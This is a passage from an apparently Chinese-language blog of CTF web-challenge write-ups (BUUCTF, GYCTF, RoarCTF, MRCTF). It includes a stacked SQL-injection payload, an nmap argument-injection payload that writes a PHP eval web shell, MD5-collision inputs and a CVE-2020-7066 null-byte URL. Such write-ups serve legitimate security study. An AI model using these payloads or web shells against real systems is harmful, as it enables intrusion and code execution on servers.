== <span class="number">1</span>:                                                    <span class="comment">#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;</span>+file+<span class="string">&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;ç»“æŸæ—¶é—´ï¼š  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(files):                                                            <span class="comment">#åŠ å…¥å¤šçº¿ç¨‹</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>

<h3 id="äºŒåå››ã€-GYCTF2020-Blacklist"><a href="#äºŒåå››ã€-GYCTF2020-Blacklist" class="headerlink" title="äºŒåå››ã€[GYCTF2020]Blacklist"></a>äºŒåå››ã€[GYCTF2020]Blacklist</h3><p>â€‹    å †å æ³¨å…¥ï¼Œå•å¼•å·é—­åˆåŸè¯­å¥åï¼Œshow tableså‘ç°Flagï¼Œä½¿ç”¨handlerç»•è¿‡è¿‡æ»¤ã€‚</p>
<p>Payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://70b76899-8425-4841-8679-f627f09be900.node3.buuoj.cn/?inject=-1&#x27;;<span class="keyword">handler</span> <span class="string">`FlagHere`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`FlagHere`</span> <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;ef4945b0-741f-4b3d-af3e-357b17cebb6c&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äºŒåäº”ã€-RoarCTF-2019-Easy-Java"><a href="#äºŒåäº”ã€-RoarCTF-2019-Easy-Java" class="headerlink" title="äºŒåäº”ã€[RoarCTF 2019]Easy Java"></a>äºŒåäº”ã€[RoarCTF 2019]Easy Java</h3><p>â€‹    å‡†ç¡®ç‚¹è¯´æ˜¯ä¸€é“ä¿¡æ¯æ³„éœ²é¢˜ã€‚</p>
<p>â€‹    1ã€helpé¡µé¢urlä¸­å­˜åœ¨filenameå‚æ•°ï¼Œæ”¹ä¸ºPOSTå‚æ•°å‘ç°è¯¥æ¥å£å¯è¯»å–æ–‡ä»¶</p>
<p>â€‹    2ã€å°è¯•è¯»å–WEB-INF/web.xml</p>
<p>â€‹    3ã€å®¡è®¡web.xmlå‘ç°å­˜åœ¨com.wm.ctf.FlagController</p>
<p>â€‹    4ã€ç›´æ¥è¯»classæ–‡ä»¶ï¼ŒWEB-INF/classes/com/wm/ctf/FlagController.class</p>
<p>â€‹    5ã€æ‰“å¼€å‘ç°base64ç¼–ç åçš„flag</p>
<p>Flagï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f27f3b6b<span class="number">-84</span>b7<span class="number">-4</span>b4d-a923<span class="number">-5</span>d3f178f87b6&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äºŒåå…­ã€-BUUCTF-2018-Online-Tool"><a href="#äºŒåå…­ã€-BUUCTF-2018-Online-Tool" class="headerlink" title="äºŒåå…­ã€[BUUCTF 2018]Online Tool"></a>äºŒåå…­ã€[BUUCTF 2018]Online Tool</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a>â€”â€”æ¥è‡ªæ´æ‚‰æ¼æ´è®ºå›ï¼Œä½œè€…ï¼šHcamael, p0wd3r</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">è°ˆescapeshellargç»•è¿‡ä¸å‚æ•°æ³¨å…¥æ¼æ´</a>â€”â€”ä½œè€…ï¼šPhithon</p>
</blockquote>
<h4 id="é‡ç‚¹å‡½æ•°ï¼š"><a href="#é‡ç‚¹å‡½æ•°ï¼š" class="headerlink" title="é‡ç‚¹å‡½æ•°ï¼š"></a><strong>é‡ç‚¹å‡½æ•°ï¼š</strong></h4><p>â€‹    escapeshellarg()ï¼š1ã€ç»™è¾“å…¥çš„å‚æ•°ä¸¤ä¾§åŠ ä¸Šä¸€ä¸ªå•å¼•å·ã€‚2ã€å¯¹å‚æ•°ä¸­çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰ã€‚3ã€ç»™è½¬ä¹‰åçš„å•å¼•å·ä¸¤è¾¹å†åŠ ä¸Šä¸€å¯¹å•å¼•å·ã€‚</p>
<p>â€‹    <a target="_blank" rel="noopener" href="https://imgchr.com/i/DM9L5V"><img src="https://s3.ax1x.com/2020/11/19/DM9L5V.png" alt="DM9L5V.png"></a></p>
<p>â€‹    escapeshellcmd()ï¼šè½¬ä¹‰shellä¸­çš„ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œå•å¼•å·å’ŒåŒå¼•å·æˆå¯¹æ—¶ä¸è½¬ä¹‰ï¼Œå•å¼•å·å’ŒåŒå¼•å·çš„æˆå¯¹æƒ…å†µçš„åˆ¤æ–­æ–¹æ³•æ˜¯ä»å·¦è‡³å³ä¾æ¬¡åŒ¹é…ã€‚</p>
<p>â€‹    <a target="_blank" rel="noopener" href="https://imgchr.com/i/DMCpr9"><img src="https://s3.ax1x.com/2020/11/19/DMCpr9.png" alt="DMCpr9.png"></a></p>
<h4 id="Shellä¸­çš„é‡ç‚¹åŸºç¡€çŸ¥è¯†ï¼š"><a href="#Shellä¸­çš„é‡ç‚¹åŸºç¡€çŸ¥è¯†ï¼š" class="headerlink" title="Shellä¸­çš„é‡ç‚¹åŸºç¡€çŸ¥è¯†ï¼š"></a><strong>Shellä¸­çš„é‡ç‚¹åŸºç¡€çŸ¥è¯†ï¼š</strong></h4><p>â€‹     1ã€â€™â€™ ç›¸å½“äºç©ºæ ¼</p>
<p>â€‹    2ã€å•å¼•å·å’ŒåŒå¼•å·ï¼šâ€™â€™ä¸­çš„å†…å®¹åªä¼šè¢«å½“ä½œæ™®é€šçš„å­—ç¬¦ä¸²;â€œâ€ä¸­çš„å†…å®¹å…è®¸ä½¿ç”¨å˜é‡ç­‰å†…å®¹ï¼Œå› æ­¤ä¸€äº›ç‰¹æ®Šç¬¦å·éœ€è¦è¢«æ‰“å°æ—¶éœ€è¦è½¬ä¹‰ã€‚ï¼ˆæ¯”è¾ƒåƒPHPï¼‰</p>
<p>â€‹    3ã€linuxä¸­æ–‡ä»¶åå‡ºç°å•å¼•å·æ—¶ï¼Œä¸ºäº†ä¾¿äºäººè§‚çœ‹ï¼Œä¼šè‡ªåŠ¨ç»™æ–‡ä»¶åä¸¤è¾¹åŠ ä¸ŠåŒå¼•å·ã€‚</p>
<p>â€‹    4ã€linuxä¸­æ–‡ä»¶åå‡ºç°ç‰¹æ®Šç¬¦å·æ—¶ï¼Œä¸ºäº†ä¾¿äºäººè§‚çœ‹ï¼Œä¼šè‡ªåŠ¨ç»™æ–‡ä»¶åä¸¤è¾¹åŠ ä¸Šå•å¼•å·ã€‚</p>
<p>â€‹        <a target="_blank" rel="noopener" href="https://imgchr.com/i/DMPykt"><img src="https://s3.ax1x.com/2020/11/19/DMPykt.png" alt="DMPykt.png"></a></p>
<p>â€‹    5ã€å‘½ä»¤è¡Œå‚æ•°ä¼ é€’é”™è¯¯æ—¶ï¼Œæœ‰æ—¶ä¸ä¼šå½±å“åç»­å‚æ•°çš„è§£æã€‚</p>
<p>Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#x27;</span></span><br><span class="line"><span class="string">&#x27; -oG 1.php &lt;?php eval($_POST[&quot;a&quot;]);?&gt;</span></span><br><span class="line"><span class="string">&#x27;</span> -oG <span class="number">1.</span>php <span class="meta">&lt;?=</span>`$_REQUEST[<span class="number">1</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Flagï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">3484494e-44</span>a7<span class="number">-48</span>d4-a6a2<span class="number">-7</span>ce586a6072d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äºŒåä¸ƒã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#äºŒåä¸ƒã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="äºŒåä¸ƒã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>äºŒåä¸ƒã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h3><p>æºä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;user&#x27;</span>] = md5((<span class="keyword">string</span>)time() . (<span class="keyword">string</span>)rand(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;uploaded&#x27;</span>])) &#123;</span><br><span class="line">    $target_path  = getcwd() . <span class="string">&quot;/upload/&quot;</span> . md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    $t_path = $target_path . <span class="string">&quot;/&quot;</span> . basename($_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    $uploaded_name = $_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    $uploaded_tmp  = $_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>, strtolower($uploaded_ext)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &quot;</span>) || ($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || ($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)|| ($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) &amp;&amp; ($_FILES[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">            $content = file_get_contents($uploaded_tmp);</span><br><span class="line">            mkdir(iconv(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, $target_path), <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">            move_uploaded_file($uploaded_tmp, $t_path);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&#123;$t_path&#125; succesfully uploaded!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php.iniä½ç½®ï¼š/usr/local/etc/php/php.ini</p>
<p><strong>disable_functions</strong>=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld</p>
<p>Flagï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">04e65838</span>-e421<span class="number">-4</span>cb7<span class="number">-97</span>f2-e908b1b214d9&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äºŒåå…«ã€"><a href="#äºŒåå…«ã€" class="headerlink" title="äºŒåå…«ã€"></a>äºŒåå…«ã€</h3><p>â€‹    å‚è€ƒä¸Šé¢çœŸå®md5ç¢°æ’Payload + PHPå¼±ç±»å‹ç»•è¿‡</p>
<p>Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2&amp;gg=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line"></span><br><span class="line">passwd=<span class="number">1234567</span>a</span><br></pre></td></tr></table></figure>

<p>Flagï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">740</span>dbefb<span class="number">-3</span>a86<span class="number">-4587</span><span class="number">-91</span>a0<span class="number">-30e6</span>af21090c&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äºŒåä¹ã€CVE-2020-7066"><a href="#äºŒåä¹ã€CVE-2020-7066" class="headerlink" title="äºŒåä¹ã€CVE-2020-7066"></a>äºŒåä¹ã€CVE-2020-7066</h3><blockquote>
<p>In PHP versions 7.2.x below 7.2.29, 7.3.x below 7.3.16 and 7.4.x below 7.4.4, while using get_headers() with user-supplied URL, if the URL contains zero (\0) character, the URL will be silently truncated at it. This may cause some software to make incorrect assumptions about the target of the get_headers() and possibly send some information to a wrong server.</p>
</blockquote>
<p>get_header %00æˆªæ–­ã€‚</p>
<p>Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http:<span class="comment">//127.0.1.123%00www.ctfhub.com</span></span><br></pre></td></tr></table></figure>

<p>Flagï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">57</span>da89d5<span class="number">-4730</span><span class="number">-4</span>ef0<span class="number">-867e-31</span>ec00306254&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ä¸‰åã€"><a href="#ä¸‰åã€" class="headerlink" title="ä¸‰åã€"></a>ä¸‰åã€</h3><p>â€‹    è¿™é“é¢˜ç®€å•Fuzzäº†ä¸€ä¸‹å‘ç°.gitæºç æ³„éœ²ï¼Œä½¿ç”¨ç‹ä¸€èˆªå¤§ä½¬çš„<a target="_blank" rel="noopener" href="https://github.com/denny0223/scrabble">GitHacker</a>å‘ç°æœ‰å­—ç¬¦å¼‚å¸¸ç»ˆæ­¢é”™è¯¯ã€‚æ¢äº†ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://github.com/denny0223/scrabble">scrabble</a>è„šæœ¬ç›´æ¥è·å¾—æºç index.phpã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


                


<p class="pink-link-context">
    <a href="/2020/11/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/CVE-2017-12149JBoss-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="next" title="CVE-2017-12149JBoss ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨">
    ä¸‹ä¸€ç¯‡ï¼šCVE-2017-12149JBoss ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨
  </a>
</p>


            </div>
			
        </div>
    </div>
</article>






</div>

        <div class="fixed-action-btn float-sitemap">
    <a class="btn-floating btn-large pink">
      <i class="fa fa-caret-square-o-up"></i>
    </a>
    <ul>
      <li><a class="btn-return-top btn-floating waves-effect green" title="å›åˆ°é¡¶éƒ¨"><i class="fa fa-arrow-circle-o-up"></i></a></li>
      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="èœå•"><i class="fa fa-navicon"></i></a></li>
    </ul>
  </div>

    </main>
    <footer class="page-footer indigo darken-1">
    
    <div class="footer-container container">
        <div class="row">
            
            <div class="social-group col m4 s12">
                <h5 class="white-text">ç¤¾äº¤</h5>
                
                    <a class="social-link" href="http://weibo.com/1956184117" target="_blank">
                        <i class="fa fa-2x fa-weibo"></i>
                    </a>
                
                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">
                        <i class="fa fa-2x fa-github"></i>
                    </a>
                
                    <a class="social-link" href="/atom.xml" target="_blank">
                        <i class="fa fa-2x fa-rss"></i>
                    </a>
                
                

            </div>
            

            
            <div class="col m8 s12">
                <h5 class="white-text">å‹æƒ…é“¾æ¥</h5>
                
                    <a class="social-link" href="http://raytaylorlin.com/" target="_blank">raytaylorismä¸»é¢˜ä½œè€…çš„æŠ€æœ¯åšå®¢</a>
                
                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">Githubåœ°å€ï¼ˆæµ‹è¯•å‹æƒ…é“¾æ¥ï¼‰</a>
                
            </div>
            
        </div>
    </div>
    

    <div class="footer-copyright pink-link-context">
        <div class="container">
            Â© 2016 example.com, All rights reserved.
            <p class="right" style="margin-top: 0;">æœ¬åšå®¢ç”± <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨ | ä¸»é¢˜ <a target="_blank" rel="noopener" href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
        </div>
    </div>
</footer>


    <noscript>
    <div class="noscript">
        <p class="center-align">å½“å‰ç½‘é€Ÿè¾ƒæ…¢æˆ–è€…ä½ ä½¿ç”¨çš„æµè§ˆå™¨ä¸æ”¯æŒåšå®¢ç‰¹å®šåŠŸèƒ½ï¼Œè¯·å°è¯•åˆ·æ–°æˆ–æ¢ç”¨Chromeã€Firefoxç­‰ç°ä»£æµè§ˆå™¨</p>
    </div>
</noscript>
<div class="noscript">
    <p class="center-align">å½“å‰ç½‘é€Ÿè¾ƒæ…¢æˆ–è€…ä½ ä½¿ç”¨çš„æµè§ˆå™¨ä¸æ”¯æŒåšå®¢ç‰¹å®šåŠŸèƒ½ï¼Œè¯·å°è¯•åˆ·æ–°æˆ–æ¢ç”¨Chromeã€Firefoxç­‰ç°ä»£æµè§ˆå™¨</p>
</div>


<script src="/js/jquery.min.js"></script>
<script src="/js/materialize.min.js"></script>

<script>
    (function($) {
        $(document).ready(function() {
            // éšè—ç¦ç”¨javascriptï¼ˆé’ˆå¯¹å¾®ä¿¡å†…ç½®æµè§ˆå™¨ï¼‰çš„æç¤º
            $('.noscript').hide();

            // å›¾ç‰‡ç¼©æ”¾æ•ˆæœ
            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');

            // ç»™å›¾ç‰‡åŠ ä¸Šç‚¹å‡»æ”¾å¤§æ•ˆæœï¼ˆmaterialboxæ’ä»¶ï¼‰
            $imgs.addClass('materialboxed').each(function(i, el) {
                $(this).attr('data-caption', $(this).attr('alt') || ' ');
            }).materialbox();

            // ä¼˜åŒ–è¡¨æ ¼çš„æ˜¾ç¤º
            $('table').each(function() {
                var $table = $(this);
                // é™¤å»å¤šè¡Œä»£ç çš„æƒ…å†µ
                if ($table.find('pre').length == 0) {
                    $table.addClass('responsive-table striped bordered');
                }
            });

            // é¦–é¡µå¹»ç¯ç‰‡
            $('.slider').slider({indicators: true, full_width: true, interval: 8000});

            $(".button-collapse").sideNav();
            $(".category-menu").sideNav();

            // é’ˆå¯¹gallery post
            $('.carousel').carousel({full_width: true});
            $('.carousel-control.prev').click(function() {
                $('.carousel').carousel('prev');
            });
            $('.carousel-control.next').click(function() {
                $('.carousel').carousel('next');
            });

            // æ–‡ç« ç›®å½•
            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();

            // ç›®å½•éšå±å¹•æ»šåŠ¨ï¼ˆé˜²æ­¢ç›®å½•è¿‡é•¿è¶Šè¿‡footerï¼‰
            var $toc = $('.toc');
            var scrollTargetTop = 0;
            $(window).scroll(function() {
                var $activeLink = $toc.find('a.active.section');
                if ($(window).scrollTop() < 100) {
                    scrollTargetTop = 0;
                } else {
                    if ($activeLink[0]) {
                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
                    }
                }
                $toc.css('top', '-' + scrollTargetTop + 'px');
            });

            // ä¿®æ­£æ–‡ç« ç›®å½•çš„left-borderé¢œè‰²
            var color = $('.table-of-contents-text').css('color');
            $('.table-of-contents-link').css('border-left-color', color);

            // é’ˆå¯¹ç§»åŠ¨ç«¯åšçš„ä¼˜åŒ–ï¼šFABæŒ‰é’®ç‚¹å‡»ä¸€ä¸‹æ”¶å›
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                $('.fixed-action-btn').addClass('click-to-toggle');
            }
            // å›åˆ°é¡¶éƒ¨
            $('.btn-return-top').click(function() {
                $('body, html').animate({
                    scrollTop: 0
                }, 500);
            });

            // é‡ç½®è¯»ä¹¦é¡µé¢çš„Tabæ ‡ç­¾é¡µçš„é¢œè‰²
            $('li.tab a').hover(function() {
                $(this).toggleClass('text-lighten-4');
            });
            $('.indicator').addClass('pink lighten-2');

            
            // æ·»åŠ newæ ‡ç­¾
            $('').append('<span class="new badge pink"></span>');
            

            // æœç´¢åŠŸèƒ½
            $('.modal-trigger').leanModal({
                // æ‰“å¼€æœç´¢æ¡†æ—¶è‡ªåŠ¨èšç„¦
                ready: function() {
                    if ($('#search').is(":visible")) {
                        $('#search-input').focus();
                    }
                }
            });
            var searchXml = "search.xml";
            if (searchXml.length == 0) {
             	searchXml = "search.xml";
            }
            var searchPath = "/" + searchXml;
            initSearch(searchPath, 'search-input', 'search-result');
        });

